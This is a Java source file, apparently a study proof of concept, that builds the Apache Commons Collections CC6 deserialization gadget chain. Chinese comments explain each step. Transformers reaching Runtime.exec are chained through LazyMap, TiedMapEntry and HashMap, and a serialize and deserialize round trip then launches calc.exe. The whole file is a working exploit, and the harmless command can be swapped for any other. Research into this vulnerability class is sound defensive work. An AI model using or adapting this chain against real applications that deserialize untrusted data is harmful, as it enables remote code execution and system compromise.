package org.example;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.util.HashMap;
import java.util.Map;

public class CC6_HashMap {
    public static void main(String[] args) throws IOException, ClassNotFoundException {

        //构造反序列化利用链
        // 1. 构造Transformer链
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(
                        "getMethod",
                        new Class[]{String.class, Class[].class},
                        new Object[]{"getRuntime", new Class[0]}
                ),
                new InvokerTransformer(
                        "invoke",
                        new Class[]{Object.class, Object[].class},
                        new Object[]{null, new Object[0]}
                ),
                new InvokerTransformer(
                        "exec",
                        new Class[]{String.class},
                        new Object[]{"calc.exe"}
                )
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        //构造lazymap对象
        Map decorate = LazyMap.decorate(new HashMap(), chainedTransformer);

        //构造TiedMapEntry对象
        TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate, "test");   //内部调用decorate.get("test")触发lazymap的transform方法

        //构造hashmap对象
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry, "test"); // 这里会调用TiedMapEntry的hashCode方法，触发LazyMap的transform方法

        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
        objectOutputStream.writeObject(hashMap);

        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
        objectInputStream.readObject();
    }
}
